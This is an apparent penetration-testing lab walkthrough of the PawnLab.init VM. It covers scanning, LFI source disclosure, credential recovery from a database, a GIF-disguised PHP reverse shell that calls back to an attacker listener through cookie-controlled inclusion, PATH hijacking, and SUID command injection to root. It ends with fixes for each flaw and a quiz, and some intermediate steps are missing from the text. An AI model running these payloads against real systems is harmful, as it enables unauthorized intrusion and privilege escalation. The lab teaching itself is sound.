Phase 1

Host Discovery

Identifying the target on the network

Current Situation

We have been given access to an authorized lab network. We know the subnet but not the target IP address. Before we can attack anything, we must find it.

What We Know

We are on a VirtualBox Host-Only network (typically 10.0.2.0/24 or 192.168.56.0/24). The PawnLab.init VM is running somewhere on this subnet.

What We Do not Know

The target IP address, which hosts are alive, what services are running.

Pentester Question

"Which host on this subnet is the PawnLab target, and is it reachable?"

Why We Perform This Step

Every penetration test begins with reconnaissance. We cannot attack what we cannot see. Host discovery maps the network and identifies potential targets. Without this step, we are operating blind.

Command — Host Discovery 
┌──(kali㉿kali)-[~]
└─$ nmap -sn 10.0.2.0/24
nmap — Network Mapper, the most widely used network discovery and auditing tool.
-sn — "Ping scan" — performs host discovery (ARP ping, ICMP echo, TCP SYN to port 443) without doing a port scan. This tells us which hosts are alive.
10.0.2.0/24 — CIDR notation for the subnet. The /24 means the first 24 bits are the network portion (255.255.255.0), giving us IPs 10.0.2.1 through 10.0.2.254.

What Happens Behind the Scenes

Nmap sends ARP requests (on local networks), ICMP echo requests, and TCP probes to every IP in the range. Hosts that respond are marked as "up." Without -sn, Nmap would also scan the most common 1000 ports on each live host, which takes much longer.

Expected Output 
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.0.2.1
Host is up (0.00042s latency).
Nmap scan report for 10.0.2.2
Host is up (0.00038s latency).
Nmap scan report for 10.0.2.15        <-- This is likely our target
Host is up (0.00051s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned
How to Interpret

We see 3 hosts. The gateway (10.0.2.1) and VirtualBox DNS (10.0.2.2) are infrastructure. The third host (10.0.2.15) is our target. In a real engagement, we would verify by checking MAC addresses and vendor info.

Confirmed Finding vs Hypothesis

Confirmed: Host 10.0.2.15 is alive and responding on the network. This is factual evidence from Nmap output. Not yet confirmed: That this is specifically the PawnLab target (we verify in Phase 2).

What Capability Did We Gain?

We now have a live IP address to target. We moved from "unknown network" to "identified host."

Alternative Tools

netdiscover — ARP-based host discovery, very effective on local networks.
arp-scan --localnet — Sends ARP requests to all hosts on the local subnet.
nmap 10.0.2.0/24 (without -sn) — Also works but performs unnecessary port scanning during discovery.

Common Beginner Mistake

Running nmap 10.0.2.0/24 without understanding that it does more than host discovery. For pure host discovery, -sn is faster and more appropriate.

What We Discovered

Target IP: 10.0.2.15 (live host on the subnet)
This gives us: A specific host to investigate further
Next Question: "What services and ports does this host expose?"
Next Phase → Port and Service Enumeration
Phase 2

Port & Service Enumeration

Mapping the attack surface

Current Situation

We know the target is at 10.0.2.15. Now we need to understand what services it is running — because services are the doors attackers walk through.

Pentester Question

"What network services are exposed on this host, and what versions are they running?"

Why We Perform This Step

Open ports represent potential entry points. Knowing the service and version tells us whether known vulnerabilities exist. An open port is NOT automatically a vulnerability — but it tells us where to look.

Command — Service Enumeration 
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC 10.0.2.15
-sV — Service/version detection. Nmap sends probes to determine what software and version is running on each open port.
-sC — Runs default NSE (Nmap Scripting Engine) scripts against discovered services. These scripts perform additional checks like banner grabbing, vulnerability detection, and information gathering.
10.0.2.15 — The target IP we discovered in Phase 1.
Expected Output 
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.2p2
80/tcp   open  http    Apache httpd 2.4.18
3306/tcp open  mysql   MySQL 5.5.5-10.1.38
How to Interpret

Four open ports:
21 (FTP) — File transfer service. May allow anonymous access or weak credentials.
22 (SSH) — Secure shell. Requires credentials to exploit.
80 (HTTP) — Web server. This is our primary attack surface for web vulnerabilities.
3306 (MySQL) — Database. If we find credentials, we may be able to connect directly.

PORT → SERVICE → VERSION → FUNCTIONALITY → ATTACK SURFACE

This is the chain we follow. Each open port represents a service. Each service has a version. Each version may have known vulnerabilities. The HTTP port (80) is typically the richest attack surface in web applications.

Why HTTP Is Our Focus

Web applications combine multiple vulnerability classes: input validation, authentication, authorization, file handling, database interaction, and more. A single web application can contain more attack surface than all other services combined.

Alternative: Full Port Scan

nmap -p- 10.0.2.15 — Scans all 65,535 TCP ports instead of the default 1000. Useful when standard ports reveal nothing interesting. Tools like RustScan and Masscan can scan all ports much faster.

What We Discovered

Ports 21, 22, 80, 3306 open — HTTP on port 80 is the primary attack surface
This gives us: A web application to investigate, FTP and MySQL to potentially exploit later
Next Question: "What does the web application look like?"
Next Phase → Manual Website Enumeration
Phase 3

Manual Website Enumeration

Understanding the application before automating

Pentester Question

"What does this web application do, and what functionality is available to me?"

Why Manual Before Automated?

Automated enumeration does not replace manual application understanding. Before running tools, a pentester must understand the application purpose, flow, and behavior. This context helps interpret automated findings and identify logic flaws that tools miss.

Command — Browse the Target 
┌──(kali㉿kali)-[~]
└─$ firefox http://10.0.2.15
Open the target in a browser. We observe the application visually and interact with it.
What We Observe

• Pages and navigation structure
• Login forms
• URL parameters (e.g., ?page=home)
• Cookies set by the application
• HTTP headers (via browser dev tools)
• Upload functionality
• Page source code
• Error messages when providing invalid input

Key Observation

The URL pattern index.php?page=test suggests the page parameter controls which content is loaded. This is a critical observation — dynamic parameters often map directly to server-side file inclusion logic.

What We Discovered

The application uses a dynamic `page` parameter and has login functionality
This gives us: A parameter to test, and a potential file inclusion attack surface

Phase 4

Directory & File Enumeration

Finding hidden content on the web server

Pentester Question

"What files and directories exist on this web server that are not linked from the main page?"

Why We Do This

Developers often leave admin pages, configuration files, backup files, test pages, or includes exposed. Web servers do not automatically hide files — a file exists and is accessible even if no link points to it. Directory brute-forcing discovers this hidden attack surface.

Command — Directory Brute-Force 
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.0.2.15 -w /usr/share/wordlists/dirb/common.txt -x php,txt
gobuster — A directory/file brute-forcing tool written in Go.
dir — Mode: directory/file discovery (as opposed to DNS or vhost modes).
-u — The target URL to scan.
-w — Path to the wordlist — a file containing candidate directory/file names to try.
-x php,txt — Also try these file extensions. Gobuster will request /admin.php, /admin.txt, etc.
Expected Output

===============================================================

[+] Method:         GET

Key Findings

/index.php — Main page (confirmed)
/login.php — Login functionality (confirmed)
/upload.php — File upload capability (important!)
/config.php — Configuration file (potentially contains database credentials)
/include — A directory that may contain include files

Why These Matter

upload.php suggests we can upload files — a potential code execution vector.
config.php likely contains database connection details — sensitive information.
/include hints at a file inclusion mechanism in the application.

Alternative Tools

dirb — Classic directory brute-forcer, simpler interface.
ffuf — Faster, more flexible, supports filtering by response size.
feroxbuster — Rust-based, recursive, very fast.

What We Discovered

upload.php, config.php, /include directory exist on the server
This gives us: Specific files to investigate, upload functionality to test, and a config file to target

Phase 5

Dynamic Page Parameter Discovery

Understanding how the application handles user input

Pentester Question

"What does the `page` parameter control, and can we manipulate it?"

Commands — Parameter Testing 
# Test different values for the page parameter
http://10.0.2.15/index.php?page=home
http://10.0.2.15/index.php?page=login
http://10.0.2.15/index.php?page=about
http://10.0.2.15/index.php?page=test
Each request changes the page content. The server dynamically loads different content based on the page parameter value.
What We Observe

• Page content changes with each value
• Invalid values may show warnings or blank pages
• The URL pattern suggests: index.php?page=VALUE

Hypothesis (Not Yet Confirmed)

The backend code may look something like:
include($_GET['page'] . ".php");

This is a HYPOTHESIS until source code or behavior confirms it. We observe that changing the parameter changes the loaded content, which suggests dynamic file inclusion.

Important Distinction

Different content loading does NOT alone prove a vulnerability. Developers may use an allowlist, a switch statement, or other safe mechanisms. We must test further to confirm whether user input actually controls file paths.

What We Discovered

The `page` parameter dynamically loads content — possible file inclusion
This gives us: A parameter to test for Local File Inclusion (LFI)
Next Question: "Can we make the application include files outside the intended directory?"
Next Phase → LFI Testing
Concept Module

Path Traversal vs LFI vs RFI

Three related but distinct concepts

TechniqueObjectiveTypical Root CauseTargetImpact
Path Traversal Access files outside intended directory Insufficient input sanitization on file paths Local files (/etc/passwd, /etc/shadow) Information disclosure
LFI (Local File Inclusion) Cause app to include a local file through attacker-controlled input Unsafe use of include(), require(), file_get_contents() Application source, logs, config files Code execution, information disclosure
RFI (Remote File Inclusion) Include a remotely hosted file allow_url_include enabled, unsanitized input Attacker-controlled URL Remote code execution

Path Traversal

Uses ../ sequences to escape the intended directory. ../../etc/passwd navigates up two directories then into /etc. This is about escaping directory boundaries.

LFI

The application code actively includes/processes a file based on user input. The attacker controls which file the server reads or executes.

RFI

The application includes a remote URL. Requires specific PHP configuration (allow_url_include=On). Less common in modern default configurations.

Key Relationship

Path Traversal != LFI, but path traversal techniques may be used as part of exploiting an LFI condition. In PawnLab, we test for path traversal as a way to determine if file inclusion is possible.

Phase 6

Basic LFI Testing

Testing whether user input controls file inclusion

Pentester Question

"Can we make the application include system files by manipulating the `page` parameter?"

Command — Basic LFI Test 
┌──(kali㉿kali)-[~]
└─$ curl "http://10.0.2.15/index.php?page=../../../../etc/passwd"
../../../../etc/passwd — This attempts path traversal to read the Linux password file. ../ navigates up one directory. Four levels up from the web root should reach the filesystem root, then we descend into /etc/passwd.

Result: Direct LFI Fails

The application does not return /etc/passwd content. This could mean:
• The application appends .php to our input (so it tries ../../../../etc/passwd.php)
• Input validation or filtering is in place
• The include path is different than expected
• The file permissions prevent reading

Common Beginner Mistake

Saying "LFI is filtered" or "the application is safe" after one failed test. A failed payload does not automatically disprove the vulnerability. We must understand how the application transforms our input before drawing conclusions.

Attacker Thought Process

"If the application appends .php to our input, then the server tries to execute the file as PHP. If we could read the source code instead of executing it, we might find a way around this. Maybe PHP stream wrappers can help..."

What We Discovered

Direct path traversal failed — the application likely appends .php or has input handling
This gives us: Understanding that the application processes our input in a specific way
Next Question: "Can we read source code instead of executing it?"
Next Phase → PHP Filter / Source Disclosure
Phase 7

PHP Filter & Source Code Disclosure

The key technique that changes everything

Pentester Question

"Can we read the PHP source code instead of having it executed by the server?"

Why This Works

When we request a PHP file normally, the server executes the code and returns the output. But PHP stream wrappers allow us to read the file as data, not execute it. The Base64 encoding converts the source code into text that the server sends back to us — bypassing execution entirely.

Command — PHP Filter Source Disclosure 
┌──(kali㉿kali)-[~]
└─$ curl "http://10.0.2.15/index.php?page=php://filter/convert.base64-encode/resource=index"
php://filter — PHP stream wrapper that applies filters while reading a resource.
convert.base64-encode — Encodes the bytes being read as Base64 text.
resource=index — The file to read (index.php, without the .php extension since the app appends it).

Instead of executing index.php, PHP reads it as raw text, Base64-encodes it, and returns the encoded string.
Expected Output (Base64 Encoded) 
PD9waHAgaW5jbHVkZSgi...base64-encoded-data...Pz4=
Decode the Output 
┌──(kali㉿kali)-[~]
└─$ # Copy the Base64 string and decode it
echo 'PD9waHAgaW5jbHVkZSgi...' | base64 -d
base64 -d — Decodes the Base64 string back to the original PHP source code. Now we can read the application source and understand exactly how it works.
Why This Is Critical

Reading source code reveals:
• The exact include mechanism (is it include($_GET['page'] . ".php")?)
• Cookie usage (the lang cookie)
• Database connection details
• Authentication logic
• All filenames referenced in the code

Key Insight

NORMAL PHP FILE REQUEST → Server executes code → You see the output
PHP FILTER SOURCE DISCLOSURE → Server reads as data → Base64-encoded source returned → You decode and read the source code

Pentester Reasoning

Why Read config?

How experienced pentesters choose targets

The Question

"How did we know to read config.php specifically?"

Evidence-Based Reasoning

1. Directory brute-forcing revealed config.php exists
2. Source code from index.php may reference config (e.g., include('config.php'))
3. Developer conventions — config.php, database.php, settings.php are universal patterns
4. Error messages may expose filenames

We never guess with certainty. We combine evidence with experience to make informed hypotheses.

Command — Read Config Source 
┌──(kali㉿kali)-[~]
└─$ curl "http://10.0.2.15/index.php?page=php://filter/convert.base64-encode/resource=config"
What Config Files Contain

• Database hostname
• Database username
• Database password
• Database name
• API keys or secrets
• Application configuration

These are the keys to the kingdom.

What We Discovered

Extracting credentials from the database

Pentester Question

"What user credentials are stored in this database?"

Command — Connect to MySQL 
┌──(kali㉿kali)-[~]

mysql — MySQL command-line client.
--host — Database server address (the target).
-u root — Database username. Note: MySQL root is a database account, NOT the Linux root account.
-p — Prompt for password (we enter the password found in config).
-D Users — Select the Users database after connection.
--skip-ssl — Connect without SSL negotiation (lab-specific workaround).
Commands — Enumerate Database 
mysql> SHOW TABLES;
+-------+
| Tables_in_Users |
+-------+
| users |
+-------+

+----------+--------------+
| Field    | Type         |

+----------+------------------+

SHOW TABLES; — Lists all tables in the selected database.
DESCRIBE users; — Shows the structure of the users table (columns and types).
SELECT * FROM users; — Retrieves all records from the users table.
Key Finding

Three user records with Base64-encoded passwords. The passwords end with =, which is a common Base64 padding character.

Encoding vs Encryption vs Hashing

Base64 Encoding: Reversible without a secret key. NOT secure password storage. Anyone can decode it.
Encryption: Reversible with the appropriate key.
Hashing: One-way transformation. Cannot be directly reversed (but can be brute-forced).

These passwords are Base64 encoded — trivially reversible.

Command — Decode Kent Password 
┌──(kali㉿kali)-[~]
└─$ echo 'Sx7wZMpVNG3Y=' | base64 -d

Kent decoded password: JWzXuBJJNy
Now we have a valid username:password combination.
Pentester Question

"We have credentials. Where are they valid? The web application? SSH? MySQL? FTP?"

Concept Module

File Upload Vulnerabilities

Understanding upload validation layers

Validation Layers an Application May Check

1. File Extension — Does the filename end in .jpg, .php, etc.?
2. MIME Type — Does the Content-Type header say image/jpeg?
3. Magic Bytes — Do the first bytes match a known file signature?
4. Filename — Is the name sanitized or validated?

5. File Content — Is the actual content analyzed?
6. File Size — Are there size limits?
7. Storage Location — Where is the file saved?
8. Execution Permissions — Can the stored file be executed?

Critical Concept: Upload != Execution

A file may be successfully uploaded but served only as static content. If the server treats .gif as an image, browsing to it will not execute PHP code. Upload success does NOT equal code execution. We need another mechanism to force the server to interpret our uploaded file as code.

Phase 10

File Upload Validation Bypass

Crafting a payload that passes upload restrictions

Pentester Question

"The upload only accepts image files. Can we create a file that passes as an image but contains executable PHP code?"

The Attack

We use Kali pre-built PHP reverse shell and modify it to pass the image-only upload validation. This is a polyglot-like file — it satisfies both image signature checks and contains executable PHP code.

Step 1 — Copy the Reverse Shell 
┌──(kali㉿kali)-[~]
└─$ cp /usr/share/webshells/php/php-reverse-shell.php ~
/usr/share/webshells/php/ — Kali stores pre-made web shells for authorized penetration testing. php-reverse-shell.php is a standard PHP reverse shell that connects back to the attacker.
~ — Current user home directory (copy destination).
Step 2 — Configure the Shell 
# Edit the copied file and change these lines:
$ip = '192.168.56.1';    // Your Kali IP
$port = 4444;              // Listening port
The target machine will initiate an outbound TCP connection to our Kali machine on port 4444. This is a reverse shell — the target connects to us, rather than us connecting to the target.
Step 3 — Add Image Header & Rename 
# Add GIF magic bytes at the top of the file
GIF87a
<?php ... reverse shell code ... ?>

# Rename to appear as a GIF image
┌──(kali㉿kali)-[~]
└─$ mv php-reverse-shell.php shell.php.gif
GIF87a — The magic bytes (file signature) for a GIF image. Many simplistic upload validators check only the first bytes of a file. By prepending this, the file appears to be a GIF.
.php.gif — The double extension. The final extension is .gif, which may pass extension checks.
Step 4 — Upload the File 
# Upload shell.php.gif through the web application upload form
# After upload, inspect the uploaded file path
# The server stores it at something like:
http://10.0.2.15/upload/b1a99ebaad4dd28f57517de36e770484.gif
Current Status

The file is uploaded. But the server likely treats .gif as an image — it will not execute PHP code if we browse to it directly. We need to find a way to make the server include our uploaded file as PHP.

Connecting the Dots — Vulnerability Chaining

Remember the lang cookie we discovered in the source code? The application uses the lang cookie to include files server-side. If we can set the lang cookie to point to our uploaded file, the server will include it — and since it contains PHP code, that code will execute.

This is vulnerability chaining: Weak file upload validation + Cookie-controlled file inclusion = Remote Code Execution.

Phase 11

Cookie-Controlled Inclusion → Remote Code Execution

The final step in the RCE chain

Pentester Question

"Can we use the cookie-controlled file inclusion to force the server to include our uploaded PHP reverse shell?"

Step 1 — Start Netcat Listener 
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
nc — Netcat, the "Swiss army knife" of networking.
-l — Listen mode (wait for incoming connections).
-v — Verbose output (show connection details).
-n — Skip DNS resolution (faster, show IPs only).
-p 4444 — Listen on local port 4444 (matching our reverse shell config).
Step 2 — Trigger the File Inclusion 
┌──(kali㉿kali)-[~]
└─$ curl -v --cookie "lang=../upload/b1a99ebaad4dd28f57517de36e770484.gif" http://10.0.2.15
curl — Command-line HTTP client.
-v — Verbose: shows full request/response headers.
--cookie — Sends a Cookie header with our value.
lang=../upload/... — The cookie value that the vulnerable application uses for file inclusion. We traverse to the upload directory and reference our uploaded GIF.
http://10.0.2.15 — The target web server.

What Happens

1. Our curl sends the request with the crafted cookie
2. The server reads the lang cookie value
3. The application includes the file at ../upload/shell.php.gif
4. PHP sees the <?php tag inside the file
5. The reverse shell code executes
6. The target connects back to our Netcat listener on port 4444

Step 3 — Connection Received

connect to [192.168.56.1] from (UNKNOWN) [10.0.2.15] 49312
Linux pawnlab 4.9.0-3-amd64 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) x86_64 GNU/Linux

$ whoami
www-data

What Capability Did We Gain?

Remote Code Execution as www-data. We can execute arbitrary commands on the target server with the privileges of the web server process. This is the most critical finding in the engagement.

The Complete RCE Chain

Weak file upload + Cookie-controlled file inclusion = Remote Code Execution

Phase 12

Shell Stabilization (TTY Upgrade)

Making our shell usable for further attacks

Why Stabilize?

A raw reverse shell lacks: tab completion, Ctrl+C functionality, interactive commands (su, vim, top), proper terminal dimensions. Without stabilization, many commands will not work correctly.

Step 1 — Spawn Pseudo-Terminal 
www-data@pawnlab:/$ python -c 'import pty; pty.spawn(\"/bin/bash\")'
python — Python interpreter (available on the target).
-c — Execute the supplied Python code as a string.
import pty — Import Python pseudo-terminal module.
pty.spawn("/bin/bash") — Spawn a Bash shell attached to a pseudo-terminal, giving us a proper prompt.
Step 2 — Background the Shell 
# Press on your keyboard:
CTRL + Z

# This backgrounds the shell job (suspends it to the background)
CTRL+Z sends a SIGTSTP signal, which backgrounds the current foreground job. This is NOT closing the shell — it is suspending it so we can fix our local terminal settings.
Step 3 — Fix Terminal Settings 
┌──(kali㉿kali)-[~]
└─$ stty raw -echo; fg
stty raw -echo — Sets the local terminal to raw mode and disables echo. This allows keypresses like Ctrl+C to be passed to the remote shell instead of being intercepted locally.
fg — Brings the backgrounded Netcat job back to the foreground.
Step 4 — Set Terminal Type 
www-data@pawnlab:/$ export TERM=xterm
www-data@pawnlab:/$ reset
export TERM=xterm — Tells the terminal emulator what type of terminal we are using. Required for programs like vim and top to work correctly.
reset — Resets the terminal to a clean state.

Important Clarification

Shell stabilization != privilege escalation. We still have the same www-data permissions. We have only made our shell more usable for interactive operations.

Phase 13

Investigating Custom Binaries

Whenever we find a custom binary (not a standard system utility), we investigate it. Custom binaries often have vulnerabilities like unsafe system() calls, command injection, or PATH hijacking. We run it to understand its behavior.

Phase 14

PATH Hijacking: Kent → Mike

Exploiting insecure command resolution

Pentester Question

"Can we make the system execute our fake 'cat' command instead of the real one?"

Why PATH Hijacking Works

When a program calls cat (without /bin/cat), the operating system searches directories in the PATH variable in order. If we create a fake cat in a directory that appears earlier in PATH, our fake version runs instead.

Understanding PATH

The PATH variable is an ordered list of directories. When you type a command, the system searches each directory in order until it finds a match:

/usr/local/bin:/usr/bin:/bin:/tmp

If we add /tmp to the FRONT, commands will be searched there first.

$ echo $PATH
/usr/local/bin:→ no 'cat' here
/usr/bin:→ real /usr/bin/cat exists
/bin:→ real /bin/cat also exists
After: export PATH=/tmp:$PATH
/tmp:← OUR FAKE cat (found first!)
/usr/local/bin:→ not checked
/usr/bin:→ not checked
Step 1 — Create Fake cat 
kent@pawnlab:~$ cd /tmp
kent@pawnlab:/tmp$ printf '#!/bin/sh\nexec /bin/bash\n' > /tmp/cat
kent@pawnlab:/tmp$ chmod +x /tmp/cat
printf '...\\n...' — Creates a small shell script.
#!/bin/sh — Shebang: tells the system to use /bin/sh to interpret this script.
exec /bin/bash — Replace the current process with a Bash shell.
> /tmp/cat — Write this content to a file called "cat" in /tmp.
chmod +x — Make the file executable.
Step 2 — Override PATH 
kent@pawnlab:/tmp$ export PATH=/tmp:$PATH
kent@pawnlab:/tmp$ which cat
/tmp/cat
export PATH=/tmp:$PATH — Prepend /tmp to PATH. Now /tmp is searched first.
which cat — Confirms that "cat" now resolves to our fake /tmp/cat.
Step 3 — Run the Vulnerable Binary 
kent@pawnlab:~$ ./msgmike
# The binary calls "cat" → our fake /tmp/cat runs
# which executes /bin/bash as the privileged context

mike@pawnlab:/home/mike$ id
uid=1001(mike) gid=1001(mike) groups=1001(mike)
The binary msgmike calls "cat" (bare name) → PATH search starts → /tmp checked first → fake /tmp/cat found → /bin/bash spawned → Shell inherits the binary intended access context (mike).

The PATH Hijacking Chain

KENT runs privileged custom binary → msgmike calls "cat" (bare name) → PATH search starts → /tmp checked first → fake /tmp/cat found → /bin/bash spawned → Shell inherits the binary access context

The Vulnerability

The vulnerability is NOT in the real cat. The vulnerability is:
Privileged program + bare command name + attacker-controlled PATH + attacker-writable directory = PATH hijacking

msg2root — A SUID-root binary. Let us break down the permission string:
Permission String
-rwsr-sr-x

root
SUID Bit
SET (s)

Understanding SUID

Normal program: UID = mike, EUID = mike (runs with mike permissions)
SUID-root program: UID = mike, EUID = root (runs with root permissions for file access)

SUID itself is NOT a vulnerability. The security problem occurs when a SUID-root program performs unsafe operations — like accepting unsanitized user input.

Command — Run msg2root 
mike@pawnlab:/home/mike$ ./msg2root
Message for root: hello && /bin/sh
sh-4.1# id
uid=1002(mike) euid=0(root) groups=0(root),1002(mike)
./msg2root — Run the SUID-root binary. Since the SUID bit is set, EUID becomes root.
hello && /bin/sh — The program accepts user input and passes it to a shell command. The && operator chains commands: "hello" runs first, then /bin/sh runs, giving us a shell.
id — Confirms: EUID = 0 (root). We have root privileges.
Command Injection

The vulnerability is command injection. The program constructs a shell command using user input without sanitization. When we input hello && /bin/sh, the shell interprets the && operator and spawns a new shell. Since the program runs with EUID=root, our spawned shell inherits those privileges.

UID (Real User)
1002 (mike)
EUID (Effective User)
0 (root)
Phase 16

Root Access & Evidence Collection

The final objective

Command — Read the Root Flag 
sh-4.1# /bin/cat /root/flag.txt
Congratulations! You have successfully completed PawnLab.init!
Flag: {PawnLab_complete_privilege_escalation}
/bin/cat — We use the absolute path /bin/cat instead of bare cat. Why? Because earlier we manipulated PATH and created /tmp/cat. Using the absolute path ensures we run the real cat binary, not our fake one.
/root/flag.txt — The flag file is in root home directory, readable only by root. We can read it because our EUID is 0.

Why /bin/cat and Not Just cat?

Bare command: cat → PATH search → could resolve to /tmp/cat (our fake)
Absolute path: /bin/cat → direct execution → no PATH search → always the real cat

After PATH hijacking, always use absolute paths to ensure you are running the intended binary.

Vulnerability Analysis

Complete Vulnerability Chain

Every finding, its impact, and how to fix it

1. Dynamic File Inclusion / LFI

Critical

Evidence: ?page= parameter controls server-side file loading
Root Cause: Unsafe use of include() with user-controlled input
Impact: Source code disclosure, potential code execution
Fix: Use allowlists for page selection; never pass user input directly to include()

2. PHP Source Disclosure

High

Evidence: php://filter reveals source code including config
Root Cause: PHP stream wrappers not disabled
Impact: Full application source exposure, credential theft
Fix: Disable allow_url_include; validate input before inclusion

3. Sensitive Configuration Exposure

High

Evidence: config.php accessible, contains database credentials
Root Cause: Configuration files accessible via web server
Impact: Database compromise, lateral movement
Fix: Move config outside web root; restrict access via .htaccess

4. Weak Credential Storage (Base64)

High

Evidence: Passwords stored as Base64 in database
Root Cause: Base64 is encoding, not encryption or hashing
Impact: Trivial credential recovery
Fix: Use bcrypt/Argon2 for password hashing

5. Credential Reuse

Medium

Evidence: Database credentials work for web login and OS user
Root Cause: Same password used across services
Impact: Lateral movement between services
Fix: Unique credentials per service; implement proper access controls

6. Insufficient File Upload Validation

Critical

Evidence: PHP code uploaded with GIF header passes validation
Root Cause: Only checking magic bytes, not actual content
Impact: Arbitrary file upload, code execution
Fix: Validate extension, MIME, and content; store outside web root; rename files

7. Cookie-Controlled File Inclusion

Critical

Evidence: lang cookie controls server-side include path
Root Cause: User-controlled cookie value used in include()
Impact: Remote code execution via uploaded file
Fix: Never use cookies to control file paths; validate and sanitize all inputs

8. Remote Code Execution

Critical

Evidence: Reverse shell obtained as www-data
Root Cause: Chain of LFI + weak upload + cookie inclusion
Impact: Full server compromise
Fix: Address all contributing vulnerabilities; implement defense in depth

9. PATH Hijacking

High

Evidence: msgmike calls `cat` without absolute path
Root Cause: Bare command name in privileged binary
Impact: Privilege escalation from kent to mike
Fix: Always use absolute paths in binaries; validate PATH integrity

10. Command Injection in SUID Binary

Critical

Evidence: msg2root passes user input to shell
Root Cause: Unsafe use of system() with unsanitized input
Impact: Root privilege escalation
Fix: Never pass user input to system(); use exec() with argument arrays

1. We found port 80 open. What should we investigate next?
Try to brute-force SSH on port 22

Manual web enumeration comes first. You must understand the application before testing for vulnerabilities. Automated scans without understanding the application produce noise, not findings.

The application is definitely vulnerable to SQL injection
The parameter is safe because it only loads pages
The parameter may control server-side file inclusion
The parameter is client-side only and cannot be exploited
Changing the parameter changes loaded content, which suggests server-side file inclusion. This is a hypothesis that must be validated — not a confirmed finding.
Dynamic content loading suggests server-side processing. The most likely hypothesis is file inclusion, which requires testing to confirm.
3. Direct path traversal failed. Does that prove the application is safe?
Yes, the vulnerability is definitely absent
Maybe, but we should test one more time
No, but it means we should give up
No — a failed test does not disprove the vulnerability
A failed payload does not automatically disprove a vulnerability. The application may append extensions, filter input, or transform the path differently than expected. We need to understand HOW it processes our input.
A single failure is not proof of safety. Reason through WHY it failed before concluding anything.
4. We uploaded a PHP file but it does not execute. What should we consider?
Upload success != execution; find another mechanism to include it
The file upload was pointless; abandon the approach
The server is immune to file upload attacks
We should delete the file immediately
Upload != execution. A file stored as .gif is treated as an image. We need another primitive (like the cookie-controlled file inclusion) to force the server to interpret the file as PHP code. This is vulnerability chaining.
The upload is still valuable — it just needs another vulnerability to trigger execution. This is why we enumerate ALL findings, not just the obvious ones.
5. A binary has the SUID bit set. Is it automatically a vulnerability?
Yes, all SUID binaries are vulnerabilities
No, but they should all be removed
No — SUID is a legitimate feature; only unsafe usage is a vulnerability
Yes, SUID always means root access
SUID is a legitimate Unix feature used by many system binaries (passwd, sudo). The vulnerability is NOT the SUID bit itself — it is unsafe operations performed by the program, such as command injection or bare command names in PATH.
SUID is normaal functionality. The security problem is in HOW the program uses its elevated privileges, not the bit itself.
